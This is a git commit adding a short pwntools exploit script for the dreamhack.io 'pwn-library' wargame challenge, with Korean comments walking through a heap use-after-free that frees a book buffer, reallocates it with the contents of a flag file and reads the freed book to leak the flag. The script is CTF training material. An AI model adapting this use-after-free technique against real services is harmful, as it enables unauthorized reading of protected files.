ab48660893971cf73f027a92741328a5f28c4ea9
wjsdurtlzuwnj <wjsdurtlzuwnj0701@gmail.com>
2021-04-29 00:00:48 +0900

    2021_04_29

---
+++ dreamhack.io/pwnable/pwn-library/ex.py
@@ -0,0 +1,24 @@
+#-*-coding:UTF-8-*-
+from pwn import *
+
+r = remote("host1.dreamhack.games", 16607)
+
+print r.recv()
+r.sendline("1") # borrow menu로 들어가서
+print r.recv()
+r.sendline("1") # malloc으로 1번책, 0x100(256)만큼 공간할당
+print r.recv()
+r.sendline("3") # return menu
+print r.recv()
+r.sendline("0") # 빌린책 free
+print r.recv()
+r.sendline("275") # 히든메뉴로 들어가서
+print r.recv()
+r.sendline("/home/pwnlibrary/flag.txt") # 파일의 내용을 읽어오는데
+print r.recv()
+r.sendline("256") # 받은 size 만큼 malloc으로 할당하는 부분이 있는데 use after free 버그를 사용하기 위해 0x100만큼 읽어옴 
+print r.recv()
+r.sendline("2") # 읽어온 책 내용읽기 위해 read menu로 들어감
+print r.recv()
+r.sendline("0") # free된 책내용을 확인하면 flag 획득
+r.interactive()
